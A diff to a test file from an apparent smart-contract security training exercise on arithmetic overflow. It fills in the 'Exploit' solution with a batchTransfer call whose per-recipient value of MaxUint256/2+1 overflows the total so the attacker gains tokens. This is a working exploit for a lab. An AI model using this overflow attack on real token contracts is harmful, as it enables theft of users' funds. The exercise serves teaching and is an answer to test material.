@@ -27,6 +27,10 @@ describe('Arithmetic Over/Underflow Exercise 4', function () {
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
 
+        let attackers = [attacker.address, deployer.address];
+        let value = ethers.constants.MaxUint256.div(2).add(1);
+        await this.token.connect(attacker).batchTransfer(attackers, value);
+
     });
 
     after(async function () {
